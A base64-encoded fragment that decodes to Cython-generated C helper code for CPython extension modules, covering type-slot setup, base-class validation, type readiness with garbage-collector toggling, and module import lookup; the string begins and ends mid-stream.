BQeV90cF9nZXRzZXQpIHtcbiAgICAgICAgUHlHZXRTZXREZWYgKmdldHNldCA9IChQeUdldFNldERlZiopIHNsb3QtPnBmdW5jO1xuICAgICAgICB3aGlsZSAoZ2V0c2V0ICYmIGdldHNldC0+bmFtZSkge1xuICAgICAgICAgICAgaWYgKGdldHNldC0+bmFtZVswXSA9PSBcJ19cJyAmJiBnZXRzZXQtPm5hbWVbMV0gPT0gXCdfXCcgJiYgc3RyY21wKGdldHNldC0+bmFtZSwgIl9fbW9kdWxlX18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKmRlc2NyID0gUHlEZXNjcl9OZXdHZXRTZXQodHlwZSwgZ2V0c2V0KTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSlcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKnB5bmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGdldHNldC0+bmFtZSk7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFweW5hbWUpKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHR5cGUsIHB5bmFtZSwgZGVzY3IpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihweW5hbWUpO1xuICAgICAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICAgICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTtcbiAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihkZXNjcik7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICArK2dldHNldDtcbiAgICAgICAgfVxuICAgIH1cbiNlbHNlXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTtcbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgIGlmIChjaGFuZ2VkKVxuICAgICAgICBQeVR5cGVfTW9kaWZpZWQodHlwZSk7XG4jZW5kaWYgIC8vIFBZX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMVxuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBpbnQgX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUoY29uc3QgY2hhciAqdHlwZV9uYW1lLCBQeV9zc2l6ZV90IGRpY3RvZmZzZXQsIFB5T2JqZWN0ICpiYXNlcykge1xuICAgIFB5X3NzaXplX3QgaSwgbjtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKGJhc2VzKTtcbiNlbHNlXG4gICAgbiA9IFB5VHVwbGVfU2l6ZShiYXNlcyk7XG4gICAgaWYgKHVubGlrZWx5KG4gPCAwKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgZm9yIChpID0gMTsgaSA8IG47IGkrKylcbiAgICB7XG4gICAgICAgIFB5VHlwZU9iamVjdCAqYjtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVNlcXVlbmNlX0dldEl0ZW0oYmFzZXMsIGkpO1xuICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7XG4jZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5VHVwbGVfR0VUX0lURU0oYmFzZXMsIGkpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HZXRJdGVtKGJhc2VzLCBpKTtcbiAgICAgICAgaWYgKCFiMCkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgICAgIGIgPSAoUHlUeXBlT2JqZWN0KikgYjA7XG4gICAgICAgIGlmICghX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoYiwgUHlfVFBGTEFHU19IRUFQVFlQRSkpXG4gICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7XG4gICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICJiYXNlIGNsYXNzIFwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIGlzIG5vdCBhIGhlYXAgdHlwZSIsIGJfbmFtZSk7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTtcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgUHlfREVDUkVGKGIwKTtcbiNlbmRpZlxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICB9XG4gICAgICAgIGlmIChkaWN0b2Zmc2V0ID09IDApXG4gICAgICAgIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgYl9kaWN0b2Zmc2V0ID0gMDtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IGItPnRwX2RpY3RvZmZzZXQ7XG4jZWxzZVxuICAgICAgICAgICAgUHlPYmplY3QgKnB5X2JfZGljdG9mZnNldCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KiliLCAiX19kaWN0b2Zmc2V0X18iKTtcbiAgICAgICAgICAgIGlmICghcHlfYl9kaWN0b2Zmc2V0KSBnb3RvIGRpY3RvZmZzZXRfcmV0dXJuO1xuICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gUHlMb25nX0FzU3NpemVfdChweV9iX2RpY3RvZmZzZXQpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHB5X2JfZGljdG9mZnNldCk7XG4gICAgICAgICAgICBpZiAoYl9kaWN0b2Zmc2V0ID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47XG4jZW5kaWZcbiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQpIHtcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1R5cGVOYW1lIGJfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoYik7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiZXh0ZW5zaW9uIHR5cGUgXCclLjIwMHNcJyBoYXMgbm8gX19kaWN0X18gc2xvdCwgIlxuICAgICAgICAgICAgICAgICAgICAgICAgImJ1dCBiYXNlIHR5cGUgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaGFzOiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAiZWl0aGVyIGFkZCBcJ2NkZWYgZGljdCBfX2RpY3RfX1wnIHRvIHRoZSBleHRlbnNpb24gdHlwZSAiXG4gICAgICAgICAgICAgICAgICAgICAgICAib3IgYWRkIFwnX19zbG90c19fID0gWy4uLl1cJyB0byB0aGUgYmFzZSB0eXBlIixcbiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVfbmFtZSwgYl9uYW1lKTtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKGJfbmFtZSk7XG4gICAgICAgICAgICAgICAgfVxuI2lmICFDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAgICAgICAgICAgZGljdG9mZnNldF9yZXR1cm46XG4jZW5kaWZcbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihiMCk7XG4jZW5kaWZcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeV9ERUNSRUYoYjApO1xuI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKFB5VHlwZU9iamVjdCAqdCkge1xuICAgIHdoaWxlICh0KSB7XG4gICAgICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopO1xuICAgICAgICBpZiAoYmFzZXMpIHtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHQgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpIHtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgICh2b2lkKV9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlO1xuI2VuZGlmXG4gICAgcmV0dXJuIFB5VHlwZV9SZWFkeSh0KTtcbiNlbHNlXG4gICAgaW50IHI7XG4gICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzTXVsdGlwbGVJbmhlcml0YW5jZSh0KSkge1xuICAgICAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpO1xuICAgIH1cbiAgICBQeU9iamVjdCAqYmFzZXMgPSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0LCB0cF9iYXNlcywgUHlPYmplY3QqKTtcbiAgICBpZiAoYmFzZXMgJiYgdW5saWtlbHkoX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUodC0+dHBfbmFtZSwgdC0+dHBfZGljdG9mZnNldCwgYmFzZXMpID09IC0xKSlcbiAgICAgICAgcmV0dXJuIC0xO1xuI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgIHtcbiAgICAgICAgaW50IGdjX3dhc19lbmFibGVkO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMGIxXG4gICAgICAgIGdjX3dhc19lbmFibGVkID0gUHlHQ19EaXNhYmxlKCk7XG4gICAgICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwO1xuICAgICNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICpyZXQsICpweV9zdGF0dXM7XG4gICAgICAgIFB5T2JqZWN0ICpnYyA9IE5VTEw7XG4gICAgICAgICNpZiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNKzAgPj0gMHgwNzAzMDQwMCkgJiZcXFxuICAgICAgICAgICAgICAgICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgIGdjID0gUHlJbXBvcnRfR2V0TW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIGdjID0gUHlJbXBvcnRfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ2MpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgcmV0dXJuIC0xO1xuICAgICAgICBweV9zdGF0dXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pc2VuYWJsZWQpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXB5X3N0YXR1cykpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgZ2Nfd2FzX2VuYWJsZWQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfc3RhdHVzKTtcbiAgICAgICAgUHlfREVDUkVGKHB5X3N0YXR1cyk7XG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZCA+IDApIHtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2Rpc2FibGUpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFyZXQpKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBQeV9ERUNSRUYocmV0KTtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShnY193YXNfZW5hYmxlZCA9PSAtMSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAjZW5kaWZcbiAgICAgICAgdC0+dHBfZmxhZ3MgfD0gUHlfVFBGTEFHU19IRUFQVFlQRTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4gICAgICAgIHQtPnRwX2ZsYWdzIHw9IFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRTtcbiNlbmRpZlxuI2Vsc2VcbiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4jZW5kaWZcbiAgICByID0gUHlUeXBlX1JlYWR5KHQpO1xuI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKVxuICAgICAgICB0LT50cF9mbGFncyAmPSB+UHlfVFBGTEFHU19IRUFQVFlQRTtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBiMVxuICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpXG4gICAgICAgICAgICBQeUdDX0VuYWJsZSgpO1xuICAgICNlbHNlXG4gICAgICAgIGlmIChnY193YXNfZW5hYmxlZCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnRwLCAqdiwgKnRiO1xuICAgICAgICAgICAgUHlFcnJfRmV0Y2goJnRwLCAmdiwgJnRiKTtcbiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuYWJsZSk7XG4gICAgICAgICAgICBpZiAobGlrZWx5KHJldCB8fCByID09IC0xKSkge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYocmV0KTtcbiAgICAgICAgICAgICAgICBQeUVycl9SZXN0b3JlKHRwLCB2LCB0Yik7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodHApO1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodik7XG4gICAgICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7XG4gICAgICAgICAgICAgICAgciA9IC0xO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihnYyk7XG4gICAgI2VuZGlmXG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIHI7XG4jZW5kaWZcbn1cblxuXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDBcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9IYXNBdHRyKFB5T2JqZWN0ICpvLCBQeU9iamVjdCAqbikge1xuICAgIFB5T2JqZWN0ICpyO1xuICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG4pKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgImhhc2F0dHIoKTogYXR0cmlidXRlIG5hbWUgbXVzdCBiZSBzdHJpbmciKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3Iobywgbik7XG4gICAgaWYgKCFyKSB7XG4gICAgICAgIHJldHVybiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpID8gLTEgOiAwO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIFB5X0RFQ1JFRihyKTtcbiAgICAgICAgcmV0dXJuIDE7XG4gICAgfVxufVxuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9fSW1wb3J0X0dldE1vZHVsZShQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICoqbW9kdWxlKSB7XG4gICAgUHlPYmplY3QgKmltcG9ydGVkX21vZHVsZSA9IFB5SW1wb3J0X0dldE1vZHVsZShxdWFsbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFpbXBvcnRlZF9tb2R1bGUpKSB7XG4gICAgICAgICptb2R1bGUgPSBOVUxMO1xuICAgICAgICBpZiAoUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICAqbW9kdWxlID0gaW1wb3J0ZWRfbW9kdWxlO1xuICAgIHJldHVybiAxO1xufVxuc3RhdGljIGludCBfX1B5eF9fSW1wb3J0X0xvb2t1cChQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICpjb25zdCAqaW1wb3J0ZWRfbmFtZXMsIFB5X3NzaXplX3QgbGVuX2ltcG9ydGVkX25hbWVzLCBQeU9iamVjdCAqKm1vZHVsZSkge1xuICAgIFB5T2JqZWN0ICppbXBvcnRlZF9tb2R1bGU7XG4gICAgUHlPYmplY3QgKnRvcF9sZXZlbF9wYWNrYWdlX25hbWU7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIGludCBzdGF0dXMsIG1vZHVsZV9mb3VuZDtcbiAgICBQeV9zc2l6ZV90IGRvdF9pbmRleDtcbiAgICBtb2R1bGVfZm91bmQgPSBfX1B5eF9fSW1wb3J0X0dldE1vZHVsZShxdWFsbmFtZSwgJmltcG9ydGVkX21vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfZm91bmQgfHwgbW9kdWxlX2ZvdW5kID09IC0xKSkge1xuICAgICAgICAqbW9kdWxlID0gTlVMTDtcbiAgICAgICAgcmV0dXJuIG1vZHVsZV9mb3VuZDtcbiAgICB9XG4gICAgaWYgKGltcG9ydGVkX25hbWVzKSB7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBsZW5faW1wb3J0ZWRfbmFtZXM7IGkrKykge1xuICAgICAgICAgICAgUHlPYmplY3QgKmltcG9ydGVkX25hbWUgPSBpbXBvcnRlZF9uYW1lc1tpXTtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuICAgICAgICAgICAgaW50IGhhc19pbXBvcnRlZF9hdHRyaWJ1dGUgPSBQeU9iamVjdF9IYXNBdHRyKGltcG9ydGVkX21vZHVsZSwgaW1wb3J0ZWRfbmFtZSk7XG4jZWxzZVxuICAgICAgICAgICAgaW50IGhhc19pbXBvcnRlZF9hdHRyaWJ1dGUgPSBQeU9iamVjdF9IYXNBdHRyV2l0aEVycm9yKGltcG9ydGVkX21vZHVsZSwgaW1wb3J0ZWRfbmFtZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaGFzX2ltcG9ydGVkX2F0dHJpYnV0ZSA9PSAtMSkpIGdvdG8gZXJyb3I7XG4jZW5kaWZcbiAgICAgICAgICAgIGlmICghaGFzX2ltcG9ydGVkX2F0dHJpYnV0ZSkge1xuICAgICAgICAgICAgICAgIGdvdG8gbm90X2ZvdW5kO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICptb2R1bGUgPSBpbXBvcnRlZF9tb2R1bGU7XG4gICAgICAgIHJldHVybiAxO1xuICAgIH1cbiAgICBkb3RfaW5kZXggPSBQeVVuaWNvZGVfRmluZENoYXIocXVhbG5hbWUsIFwnLlwnLCAwLCBQWV9TU0laRV9UX01BWCwgMSk7XG4gICAgaWYgKGRvdF9pbmRleCA9PSAtMSkge1xuICAgICAgICAqbW9kdWxlID0gaW1wb3J0ZWRfbW9kdWxlO1xuICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGRvdF9pbmRleCA9PSAtMikpIGdvdG8gZXJyb3I7XG4gICAgdG9wX2xldmVsX3BhY2thZ2VfbmFtZSA9IFB5VW5pY29kZV9TdWJzdHJpbmcocXVhbG5hbWUsIDAsIGRvdF9pbmRleCk7XG4gICAgaWYgKHVubGlrZWx5KCF0b3BfbGV2ZWxfcGFja2FnZV9uYW1lKSkgZ290byBlcnJvcjtcbiAgICBQeV9ERUNSRUYoaW1wb3J0ZWRfbW9kdWxlKTtcbiAgICBzdGF0dXMgPSBfX1B5eF9fSW1wb3J0X0dldE1vZHVsZSh0b3BfbGV2ZWxfcGFja2FnZV9uYW1lLCBtb2R1bGUpO1xuICAgIFB5X0RFQ1JFRih0b3BfbGV2ZWxfcGFja2FnZV9uYW1lKTtcbiAgICByZXR1cm4gc3RhdHVzO1xuZXJyb3I6XG4gICAgUHlfREVDUkVGKGltcG9ydGVkX21vZHVsZSk7XG4gICAgKm1vZHVsZSA9IE5VTEw7XG4gICAgcmV0dXJuIC0xO1xubm90X2ZvdW5kOlxuICAgIFB5X0RFQ1JFRihpbXBvcnRlZF9tb2R1bGUpO1xuICAgICptb2R1bGUgPSBOVUxMO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnQoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqaW1wb3J0ZWRfbmFtZXMsIFB5X3NzaXplX3QgbGVuX2ltcG9ydGVkX25hbWVzLCBQeU9iamVjdCAqcXVhbG5hbWUsIGludCBsZXZlbCkge1xuICAgIFB5T2JqZWN0ICptb2R1bGUgPSAwO1xuICAgIFB5T2JqZWN0ICplbXB0eV9kaWN0ID0gMDtcbiAgICBQeU9iamVjdCAqZnJvbV9saXN0ID0gMDtcbiAgICBpbnQgbW9kdWxlX2ZvdW5kO1xuICAgIGlmICghcXVhbG5hbWUpIHtcbiAgICAgICAgcXVhbG5hbWUgPSBuYW1lO1xuICAgIH1cbiAgICBtb2R1bGVfZm91bmQgPSBfX1B5eF9fSW1wb3J0X0xvb2t1cChxdWFsbmFtZSwgaW1wb3J0ZWRfbmFtZXMsIGxlbl9pbXBvcnRlZF9uYW1lcywgJm1vZHVsZSk7XG4gICAgaWYgKGxpa2VseShtb2R1bGVfZm91bmQgPT0gMSkpIHtcbiAgICAgICAgcmV0dXJuIG1vZHVsZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KG1vZHVsZV9mb3VuZCA9PSAtMSkpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGVtcHR5X2RpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgaWYgKHVubGlrZWx5KCFlbXB0eV9kaWN0KSlcbiAgICAgICAgZ290byBiYWQ7XG4gICAgaWYgKGltcG9ydGVkX25hbWVzKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIGZyb21fbGlzdCA9IF9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoaW1wb3J0ZWRfbmFtZXMsIGxlbl9pbXBvcnRlZF9uYW1lcyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZnJvbV9saXN0KSlcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuI2Vsc2VcbiAgICAgICAgZnJvbV9saXN0ID0gUHlMaXN0X05ldyhsZW5faW1wb3J0ZWRfbmFtZXMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZyb21fbGlzdCkpIGdvdG8gYmFkO1xuICAgICAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPGxlbl9pbXBvcnRlZF9uYW1lczsgKytpKSB7XG4gICAgICAgICAgICBpZiAoUHlMaXN0X1NldEl0ZW0oZnJvbV9saXN0LCBpLCBfX1B5eF9OZXdSZWYoaW1wb3J0ZWRfbmFtZXNbaV0pKSA8IDApIGdvdG8gYmFkO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICB9XG4gICAgaWYgKGxldmVsID09IC0xKSB7XG4gICAgICAgIGNvbnN0IGNoYXIqIHBhY2thZ2Vfc2VwID0gc3RyY2hyKF9fUHl4X01PRFVMRV9OQU1FLCBcJy5cJyk7XG4gICAgICAgIGlmIChwYWNrYWdlX3NlcCAhPSAoMCkpIHtcbiAgICAgICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KFxuICAgICAgICAgICAgICAgIG5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIGVtcHR5X2RpY3QsIGZyb21fbGlzdCwgMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIHtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIVB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfSW1wb3J0RXJyb3IpKSlcbiAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICBsZXZlbCA9IDA7XG4gICAgfVxuICAgIGlmICghbW9kdWxlKSB7XG4gICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KFxuICAgICAgICAgICAgbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgZW1wdHlfZGljdCwgZnJvbV9saXN0LCBsZXZlbCk7XG4gICAgfVxuYmFkOlxuICAgIFB5X1hERUNSRUYoZnJvbV9saXN0KTtcbiAgICBQeV9YREVDUkVGKGVtcHR5X2RpY3QpO1xuICAgIHJldHVybiBtb2R1bGU7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKSB7XG4gICAgUHlPYmplY3QqIHZhbHVlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihtb2R1bGUsIG5hbWUpO1xuICAgIGlmICh1bmxpa2VseSghdmFsdWUpICYmIFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfQXR0cmlidXRlRXJyb3IpKSB7XG4gICAgICAgIGNvbnN0IGNoYXIqIG1vZHVsZV9uYW1lX3N0ciA9IDA7XG4gICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfbmFtZSA9IDA7XG4gICAgICAgIFB5T2JqZWN0KiBtb2R1bGVfZG90ID0gMDtcbiAgICAgICAgUHlPYmplY3QqIGZ1bGxfbmFtZSA9IDA7XG4gICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIG1vZHVsZV9uYW1lX3N0ciA9IFB5TW9kdWxlX0dldE5hbWUobW9kdWxlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGVfbmFtZV9zdHIpKSB7IGdvdG8gbW9kYmFkOyB9XG4gICAgICAgIG1vZHVsZV9uYW1lID0gUHlVbml